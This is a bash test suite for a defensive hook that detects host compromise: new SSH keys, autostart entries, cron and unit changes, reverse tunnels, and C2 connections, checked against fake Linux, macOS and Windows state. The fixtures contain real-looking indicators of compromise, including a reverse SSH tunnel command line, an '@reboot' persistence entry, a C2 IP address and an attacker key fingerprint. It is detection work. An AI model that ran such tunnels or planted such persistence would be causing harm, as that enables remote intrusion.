#!/usr/bin/env bash
# Tests for .claude/hooks/cfn-host-drift-check.sh (daily host-drift tripwire).
#
# Why it exists (2026-10-29): a trojanized editor extension planted an attacker
# SSH key, autostart entries and a reverse tunnel. The hook notices that CLASS
# of change (new login key, new autostart, tunnel) once a day, and known IOCs
# every session.
#
# Everything runs against a fake HOME plus PATH stubs (ps, ss, crontab,
# systemctl, ssh-keygen, iptables, uname, powershell.exe). No real machine
# state is read or written.
#
# HOOK_UNDER_TEST lets a mutated copy prove the tests can fail.
# Run: bash tests/test-host-drift-check.sh

set -uo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
HOOK="${HOOK_UNDER_TEST:-$REPO_ROOT/.claude/hooks/cfn-host-drift-check.sh}"
source "$REPO_ROOT/.claude/cfn-scripts/lib/safe-rm.sh" || exit 1  # cfn_safe_rm_tmp

PASS=0
FAIL=0
ok()  { PASS=$((PASS + 1)); echo "ok: $1"; }
bad() { FAIL=$((FAIL + 1)); echo "FAIL: $1"; }

WORK="$(mktemp -d "${TMPDIR:-/tmp}/cfn-hostdrift-test.XXXXXX")" || exit 1
trap 'cfn_safe_rm_tmp "$WORK"' EXIT

IOC_FP='SHA256:0Z6R+DF64Do2nwQic8a7kkfDLNNk4IiK+2U2Rci4htk'
C2_IP='134.209.82.225'

STUBS="$WORK/stubs"      # always on PATH
WINSTUB="$WORK/winstub"  # holds powershell.exe, on PATH only when wanted
DATA="$WORK/data"
mkdir -p "$STUBS" "$WINSTUB"

mkstub() { # mkstub <dir> <name> <body>
  printf '#!/usr/bin/env bash\n%s\n' "$3" > "$1/$2"
  chmod +x "$1/$2"
}
mkstub "$STUBS" ps        'cat "$STUB_DATA/ps.txt" 2>/dev/null; exit 0'
mkstub "$STUBS" ss        'cat "$STUB_DATA/ss.txt" 2>/dev/null; exit 0'
mkstub "$STUBS" uname     'echo "${FAKE_UNAME:-Linux}"'
mkstub "$STUBS" crontab   '[ "$1" = "-l" ] || exit 1
[ -f "$STUB_DATA/crontab.txt" ] && { cat "$STUB_DATA/crontab.txt"; exit 0; }
echo "no crontab for test" >&2; exit 1'
mkstub "$STUBS" systemctl 'case "$*" in
  *list-unit-files*) echo "UNIT FILE STATE"; cat "$STUB_DATA/units.txt" 2>/dev/null; echo; echo "0 unit files listed."; exit 0;;
  *is-enabled*) echo disabled; exit 1;;
  *is-active*) echo inactive; exit 3;;
esac; exit 0'
mkstub "$STUBS" ssh-keygen 'f="$2"
[ -f "$f" ] || exit 1
[ -f "$STUB_DATA/keygen_fail" ] && exit 1
while IFS= read -r line; do
  [ -z "$line" ] && continue
  case "$line" in \#*) continue;; esac
  c=$(printf "%s" "$line" | awk "{print \$NF}")
  case "$line" in
    *EVILBLOB*) fp="SHA256:0Z6R+DF64Do2nwQic8a7kkfDLNNk4IiK+2U2Rci4htk";;
    *) fp="SHA256:fake$(printf "%s" "$line" | cksum | cut -d" " -f1)";;
  esac
  echo "256 $fp $c (ED25519)"
done < "$f"'
mkstub "$STUBS" iptables  '[ -f "$STUB_DATA/iptables.txt" ] && { cat "$STUB_DATA/iptables.txt"; exit 0; }
echo "Permission denied (you must be root)" >&2; exit 4'
mkstub "$WINSTUB" powershell.exe '[ -f "$STUB_DATA/win.sleep" ] && exec sleep "$(cat "$STUB_DATA/win.sleep")"
[ -f "$STUB_DATA/win.fail" ] && exit 1
sed "s/\$/\r/" "$STUB_DATA/win.out" 2>/dev/null; exit 0'

# PATH without any real powershell.exe (WSL puts one on PATH); the fake one is opt-in.
SAFE_PATH=$(printf '%s' "$PATH" | tr ':' '\n' | while IFS= read -r d; do [ -x "$d/powershell.exe" ] || printf '%s\n' "$d"; done | paste -sd: -)

# Fresh machine: fake HOME, empty stub data, no powershell on PATH.
HOME_F=""
WITH_WIN=0
newenv() {
  cfn_safe_rm_tmp "$WORK/home" 2>/dev/null
  cfn_safe_rm_tmp "$DATA" 2>/dev/null
  HOME_F="$WORK/home"
  mkdir -p "$HOME_F/.ssh" "$HOME_F/.config" "$DATA"
  printf 'ssh-ed25519 AAAAKEEP owner@laptop\n' > "$HOME_F/.ssh/authorized_keys"
  WITH_WIN=0
  : > "$DATA/ps.txt"
  : > "$DATA/ss.txt"
  FAKE_UNAME=Linux
  printf 'iptables-ok -A OUTPUT -p tcp --dport 22 -m comment --comment cfn-ssh-egress -j REJECT\n' > "$DATA/iptables.txt"
}
STATE_DIR() { echo "$HOME_F/.local/state/cfn-host-drift"; }

OUT=""; RC=0
run_hook() { # run_hook [args...]  (stdin is a SessionStart-style JSON payload)
  local p="$STUBS:$SAFE_PATH"
  [ "$WITH_WIN" = 1 ] && p="$WINSTUB:$p"
  OUT=$(cd "$WORK" && echo '{"hook_event_name":"SessionStart"}' | env -u XDG_STATE_HOME \
        HOME="$HOME_F" PATH="$p" STUB_DATA="$DATA" FAKE_UNAME="$FAKE_UNAME" \
        CFN_HOST_DRIFT_CROND="$WORK/cron.d" CFN_HOST_DRIFT_LIBROOT="$WORK/Library" \
        bash "$HOOK" "$@" 2>/dev/null)
  RC=$?
}
has()  { printf '%s' "$OUT" | grep -qiF -- "$1"; }

# ---------------------------------------------------------------- tests

test_first_run_creates_baseline() {
  newenv
  run_hook
  [ "$RC" = 0 ] && ok "first run exits 0" || bad "first run rc=$RC"
  [ "$OUT" = "host drift baseline created" ] && ok "first run prints exactly the one baseline line" || bad "first run output: [$OUT]"
  [ -s "$(STATE_DIR)/baseline.txt" ] && ok "baseline file saved" || bad "baseline file missing"
}

test_daily_gate_is_silent_and_fast() {
  newenv
  run_hook
  echo 'ssh-ed25519 AAAANEWKEY intruder@x' >> "$HOME_F/.ssh/authorized_keys"
  run_hook
  [ -z "$OUT" ] && ok "second run inside 24h is silent even though a key was added" || bad "gate leaked output: [$OUT]"
  [ "$RC" = 0 ] && ok "gated run exits 0" || bad "gated rc=$RC"
}

test_no_change_is_silent_with_force() {
  newenv
  run_hook
  run_hook --force
  [ -z "$OUT" ] && ok "no change + --force prints nothing" || bad "unexpected output on no change: [$OUT]"
}

test_new_key_alerts_and_repeats_until_accept() {
  newenv
  run_hook
  echo 'ssh-ed25519 AAAANEWKEY intruder@x' >> "$HOME_F/.ssh/authorized_keys"
  run_hook --force
  has "host drift" && ok "drift alert header printed" || bad "no drift alert: [$OUT]"
  has "intruder@x" && ok "alert names the new key comment" || bad "new key not named: [$OUT]"
  has "+" && ok "alert has + diff line" || bad "no + line"
  has "--accept" && ok "alert tells how to accept" || bad "no --accept hint"
  [ "$RC" = 0 ] && ok "alert run exits 0" || bad "alert rc=$RC"
  [ -s "$(STATE_DIR)/drift.log" ] && ok "drift appended to log" || bad "drift.log missing"
  run_hook --force
  has "intruder@x" && ok "alert repeats (baseline not auto-updated)" || bad "alert did not repeat: [$OUT]"
  run_hook --accept
  has "baseline updated" && ok "--accept confirms" || bad "--accept output: [$OUT]"
  run_hook --force
  [ -z "$OUT" ] && ok "silent after --accept" || bad "alert after accept: [$OUT]"
}

test_cron_and_autostart_and_units() {
  newenv
  run_hook
  echo '0 3 * * * /usr/bin/backup-thing' > "$DATA/crontab.txt"
  run_hook --force
  has "backup-thing" && ok "new crontab line detected" || bad "cron change missed: [$OUT]"
  run_hook --accept
  : > "$HOME_F/.config/autostart-placeholder"
  mkdir -p "$HOME_F/.config/autostart"
  : > "$HOME_F/.config/autostart/updater.desktop"
  run_hook --force
  has "updater.desktop" && ok "new autostart entry detected" || bad "autostart missed: [$OUT]"
  run_hook --accept
  echo 'evil-helper.service enabled enabled' > "$DATA/units.txt"
  run_hook --force
  has "evil-helper.service" && ok "new enabled user unit detected" || bad "unit missed: [$OUT]"
}

test_comment_only_crontab_change_is_ignored() {
  newenv
  printf '0 3 * * * /usr/bin/job\n' > "$DATA/crontab.txt"
  run_hook
  printf '# edited at 12:00\n\n0 3 * * * /usr/bin/job\n' > "$DATA/crontab.txt"
  run_hook --force
  [ -z "$OUT" ] && ok "crontab comments/blank lines are stripped" || bad "comment noise: [$OUT]"
}

test_ioc_fingerprint_alerts_every_session() {
  newenv
  run_hook
  echo 'ssh-ed25519 AAAAEVILBLOB svc-telemetry' >> "$HOME_F/.ssh/authorized_keys"
  run_hook   # no --force: the daily gate is closed
  has "possible compromise" && ok "IOC fingerprint alerts through a closed gate" || bad "IOC missed behind gate: [$OUT]"
  has "$IOC_FP" && ok "alert names the fingerprint" || bad "fingerprint not named"
  run_hook
  has "possible compromise" && ok "IOC alerts again next session" || bad "IOC alert not repeated"
}

test_ioc_tunnel_process() {
  newenv
  run_hook
  echo '4242 ssh -N -R *:0:localhost:22 root@198.51.100.7' > "$DATA/ps.txt"
  run_hook
  has "possible compromise" && has "tunnel" && ok "reverse tunnel process is an IOC" || bad "tunnel missed: [$OUT]"
  echo '4243 /usr/bin/autossh -M 0 -N host' > "$DATA/ps.txt"
  run_hook
  has "autossh" && ok "autossh is an IOC" || bad "autossh missed: [$OUT]"
}

test_own_process_not_flagged_as_tunnel() {
  newenv
  run_hook
  echo "555 bash /x/.claude/hooks/cfn-host-drift-check.sh ssh -N -R autossh" > "$DATA/ps.txt"
  run_hook
  [ -z "$OUT" ] && ok "the check's own process line is excluded" || bad "self-detected: [$OUT]"
}

test_plain_ssh_sessions_not_flagged() {
  newenv
  run_hook
  printf '%s\n' '600 sshd: masha [priv]' '601 ssh -L 8080:localhost:80 host' '602 /usr/bin/ssh git@github.com' > "$DATA/ps.txt"
  run_hook --force
  [ -z "$OUT" ] && ok "sshd and non -R ssh clients are not flagged" || bad "false tunnel positive: [$OUT]"
}

test_ioc_persistence_paths() {
  newenv
  run_hook
  : > "$HOME_F/.config/.smt"
  run_hook
  has "possible compromise" && has ".smt" && ok "~/.config/.smt is an IOC" || bad ".smt missed: [$OUT]"
  cfn_safe_rm_tmp "$HOME_F/.config/.smt"
  echo '@reboot ~/.config/.smt' > "$DATA/crontab.txt"
  run_hook
  has "possible compromise" && ok "@reboot .smt crontab line is an IOC" || bad "cron .smt missed: [$OUT]"
}

test_ioc_c2_connection() {
  newenv
  run_hook
  echo "ESTAB 0 0 10.0.0.5:51234 $C2_IP:8099" > "$DATA/ss.txt"
  run_hook
  has "possible compromise" && has "$C2_IP" && ok "connection to C2 IP is an IOC" || bad "C2 missed: [$OUT]"
}

test_first_run_with_ioc_still_alerts() {
  newenv
  echo 'ssh-ed25519 AAAAEVILBLOB svc-telemetry' >> "$HOME_F/.ssh/authorized_keys"
  run_hook
  has "possible compromise" && ok "IOC on very first run is not swallowed by baseline creation" || bad "first-run IOC missed: [$OUT]"
}

test_gate_expires_after_24h() {
  newenv
  run_hook
  echo 'ssh-ed25519 AAAANEWKEY intruder@x' >> "$HOME_F/.ssh/authorized_keys"
  echo $(( $(date +%s) - 90000 )) > "$(STATE_DIR)/last-run"
  run_hook
  has "intruder@x" && ok "stale stamp (>24h) re-runs the snapshot" || bad "gate did not expire: [$OUT]"
}

test_show_prints_snapshot_without_state_change() {
  newenv
  run_hook --show
  has "authorized_keys" && has "owner@laptop" && ok "--show prints the snapshot" || bad "--show output: [$OUT]"
  [ ! -e "$(STATE_DIR)/baseline.txt" ] && ok "--show leaves no baseline behind" || bad "--show wrote a baseline"
}

test_firewall_guard() {
  newenv
  run_hook --show
  has "present" && ok "iptables guard comment seen as present" || bad "guard present not reported: [$OUT]"
  rm -f "$DATA/iptables.txt"
  run_hook --show
  printf '%s' "$OUT" | grep -qE 'firewall[^|]*\|unavailable' && ok "iptables failure reported as unavailable (no sudo)" || bad "iptables unavailable not reported: [$OUT]"
  printf 'iptables-ok -A OUTPUT -j ACCEPT\n' > "$DATA/iptables.txt"
  run_hook --show
  printf '%s' "$OUT" | grep -qE 'firewall[^|]*\|absent' && ok "guard rule missing reported as absent" || bad "absent not reported: [$OUT]"
}

test_keygen_failure_never_breaks_session() {
  newenv
  touch "$DATA/keygen_fail"
  run_hook
  [ "$RC" = 0 ] && ok "ssh-keygen failure still exits 0" || bad "keygen fail rc=$RC"
}

test_unavailable_section_is_stable_not_noisy() {
  newenv
  rm -f "$DATA/iptables.txt"
  run_hook
  run_hook --force
  [ -z "$OUT" ] && ok "unavailable sections add no noise run to run" || bad "unavailable noise: [$OUT]"
}

test_macos_sections() {
  newenv
  FAKE_UNAME=Darwin
  mkdir -p "$HOME_F/Library/LaunchAgents"
  : > "$HOME_F/Library/LaunchAgents/com.example.ok.plist"
  run_hook
  run_hook --show
  has "com.example.ok.plist" && ok "macOS LaunchAgents listed" || bad "launchagents missing: [$OUT]"
  : > "$HOME_F/Library/LaunchAgents/com.apple.sysmond.plist"
  run_hook
  has "possible compromise" && has "sysmond" && ok "macOS sysmond plist is an IOC" || bad "sysmond missed: [$OUT]"
  FAKE_UNAME=Linux
}

# ---- Windows (fake powershell.exe, output uses TAG|value lines, CRLF) ----

WIN_BASE='AKU|ssh-ed25519 AAAAWINKEY winowner@pc
AKA_ABSENT|
STARTUP|C:\Users\x\Startup\onedrive.lnk
TASK|\GoogleUpdateTask
RUN|HKCU|OneDrive
RUN|HKLM|SecurityHealth
FW|cfn-ssh-egress-block|True
C2|0
RD|RustDesk2.toml|direct-server = '"'"'Y'"'"'
RD|RustDesk2.toml|verification-method = '"'"'use-both-passwords'"'"'
RD|RustDesk.toml|password = '"'"'SECRETPASSWORDVALUE123'"'"'
RD|RustDesk2.toml|whitelist = '"'"'203.0.113.9'"'"'
RD|RustDesk2.toml|key = '"'"'SECRETKEYVALUE456'"'"''

test_windows_snapshot_and_secret_hashing() {
  newenv
  WITH_WIN=1
  printf '%s\n' "$WIN_BASE" > "$DATA/win.out"
  run_hook --show
  has "winowner@pc" && ok "Windows authorized_keys fingerprint section present" || bad "win keys missing: [$OUT]"
  has "GoogleUpdateTask" && has "SecurityHealth" && ok "Windows tasks and Run keys listed" || bad "win tasks/run missing"
  has "direct-server" && has "use-both-passwords" && ok "RustDesk plain toggles shown" || bad "rustdesk toggles missing: [$OUT]"
  has "password=sha:" && ok "RustDesk password reported as hash only" || bad "password hash line missing: [$OUT]"
  if has "SECRETPASSWORDVALUE123" || has "SECRETKEYVALUE456" || has "203.0.113.9"; then
    bad "secret value leaked into snapshot"
  else
    ok "no RustDesk secret value in --show output"
  fi
}

test_windows_change_detected_and_secret_never_in_alert() {
  newenv
  WITH_WIN=1
  printf '%s\n' "$WIN_BASE" > "$DATA/win.out"
  run_hook
  { printf '%s\n' "$WIN_BASE"; echo 'TASK|\NewVendorTask'; echo "RD|RustDesk.toml|password = 'ANOTHERSECRET789'"; } | grep -v "SECRETPASSWORDVALUE123" > "$DATA/win.out"
  run_hook --force
  has "NewVendorTask" && ok "new non-Microsoft scheduled task detected" || bad "task change missed: [$OUT]"
  has "password" && ok "RustDesk password change surfaced" || bad "password change missed: [$OUT]"
  has "ANOTHERSECRET789" && bad "secret leaked in drift alert" || ok "drift alert carries no secret value"
}

test_windows_iocs_persist_across_gated_sessions() {
  newenv
  WITH_WIN=1
  printf '%s\n' "$WIN_BASE" > "$DATA/win.out"
  run_hook
  { printf '%s\n' "$WIN_BASE"; echo 'STARTUP|C:\Users\x\Startup\sysmon.cmd'; echo 'TASK|\SysMon'; echo 'WINPATH|.config\smt.cmd'; } > "$DATA/win.out"
  run_hook --force
  has "possible compromise" && has "sysmon.cmd" && ok "Windows startup sysmon.cmd flagged" || bad "sysmon.cmd missed: [$OUT]"
  has "SysMon" && ok "Windows SysMon task flagged" || bad "SysMon missed"
  run_hook   # gated
  has "possible compromise" && has "sysmon.cmd" && ok "Windows IOC re-alerts on later gated session" || bad "win IOC lost behind gate: [$OUT]"
}

test_windows_c2_connection() {
  newenv
  WITH_WIN=1
  printf '%s\n' "$WIN_BASE" > "$DATA/win.out"
  run_hook
  sed 's/^C2|0$/C2|2/' "$DATA/win.out" > "$DATA/win.out.new"; mv "$DATA/win.out.new" "$DATA/win.out"
  run_hook --force
  has "possible compromise" && has "$C2_IP" && ok "Windows connection to C2 flagged" || bad "win C2 missed: [$OUT]"
}

test_no_powershell_means_no_windows_section() {
  newenv
  WITH_WIN=0
  run_hook --show
  printf '%s' "$OUT" | grep -qi 'windows\|rustdesk' && bad "windows section present without powershell.exe" || ok "no windows section when powershell.exe is absent"
}

test_powershell_failure_is_unavailable_and_quiet() {
  newenv
  WITH_WIN=1
  printf '%s\n' "$WIN_BASE" > "$DATA/win.out"
  run_hook
  touch "$DATA/win.fail"
  run_hook --force
  [ -z "$OUT" ] && ok "powershell failure after good baseline raises no false alarm" || bad "false alarm on ps failure: [$OUT]"
  [ "$RC" = 0 ] && ok "powershell failure exits 0" || bad "ps fail rc=$RC"
  rm -f "$DATA/win.fail"
  newenv; WITH_WIN=1; touch "$DATA/win.fail"
  run_hook --show
  printf '%s' "$OUT" | grep -qE 'windows[^|]*\|unavailable' && ok "failed powershell shows as unavailable in snapshot" || bad "unavailable marker missing: [$OUT]"
}

test_powershell_hang_respects_time_cap() {
  newenv
  WITH_WIN=1
  echo 30 > "$DATA/win.sleep"
  OUT=$(cd "$WORK" && t0=$(date +%s) && echo '{}' | env -u XDG_STATE_HOME HOME="$HOME_F" PATH="$WINSTUB:$STUBS:$SAFE_PATH" \
        STUB_DATA="$DATA" FAKE_UNAME=Linux CFN_HOST_DRIFT_WIN_TIMEOUT=1 bash "$HOOK" --force 2>/dev/null; echo "rc=$? secs=$(( $(date +%s) - t0 ))")
  secs=$(printf '%s' "$OUT" | sed -n 's/.*secs=\([0-9]*\).*/\1/p')
  [ -n "$secs" ] && [ "$secs" -le 10 ] && ok "hung powershell cut off (took ${secs}s)" || bad "hang not capped: [$OUT]"
  printf '%s' "$OUT" | grep -q 'rc=0' && ok "hang case exits 0" || bad "hang rc: [$OUT]"
}

test_state_dir_honours_xdg_state_home() {
  newenv
  local x="$WORK/xdg"
  mkdir -p "$x"
  echo '{}' | env XDG_STATE_HOME="$x" HOME="$HOME_F" PATH="$STUBS:$SAFE_PATH" STUB_DATA="$DATA" FAKE_UNAME=Linux bash "$HOOK" >/dev/null 2>&1
  [ -s "$x/cfn-host-drift/baseline.txt" ] && ok "state lives under XDG_STATE_HOME when set" || bad "XDG state dir unused"
}

test_first_run_creates_baseline
test_daily_gate_is_silent_and_fast
test_no_change_is_silent_with_force
test_new_key_alerts_and_repeats_until_accept
test_cron_and_autostart_and_units
test_comment_only_crontab_change_is_ignored
test_ioc_fingerprint_alerts_every_session
test_ioc_tunnel_process
test_own_process_not_flagged_as_tunnel
test_plain_ssh_sessions_not_flagged
test_ioc_persistence_paths
test_ioc_c2_connection
test_first_run_with_ioc_still_alerts
test_gate_expires_after_24h
test_show_prints_snapshot_without_state_change
test_firewall_guard
test_keygen_failure_never_breaks_session
test_unavailable_section_is_stable_not_noisy
test_macos_sections
test_windows_snapshot_and_secret_hashing
test_windows_change_detected_and_secret_never_in_alert
test_windows_iocs_persist_across_gated_sessions
test_windows_c2_connection
test_no_powershell_means_no_windows_section
test_powershell_failure_is_unavailable_and_quiet
test_powershell_hang_respects_time_cap
test_state_dir_honours_xdg_state_home

echo "pass=$PASS fail=$FAIL"
[ "$FAIL" = 0 ]
